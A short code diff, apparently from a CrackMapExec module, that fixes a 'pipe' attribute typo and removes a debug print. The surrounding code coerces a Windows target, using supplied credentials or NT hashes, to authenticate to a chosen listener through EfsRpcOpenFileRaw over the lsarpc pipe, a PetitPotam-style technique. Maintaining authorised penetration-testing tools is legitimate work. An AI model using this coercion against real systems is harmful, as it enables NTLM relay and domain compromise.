@@ -26,13 +26,12 @@ class CMEModule:
         self.listener = "127.0.0.1"
         if 'LISTENER' in module_options:
             self.listener  = module_options['LISTENER']
-        self.pip = "lsarpc"
+        self.pipe = "lsarpc"
         if 'PIPE' in module_options:
             self.pipe  = module_options['PIPE']
 
 
     def on_login(self, context, connection):
-        print(connection.host)
         plop = CoerceAuth()
         dce = plop.connect(connection.username, password=connection.password, domain=connection.domain, lmhash=connection.lmhash, nthash=connection.nthash, target=connection.host, pipe=self.pipe, targetIp=connection.host)
         if plop.EfsRpcOpenFileRaw(dce, self.listener):
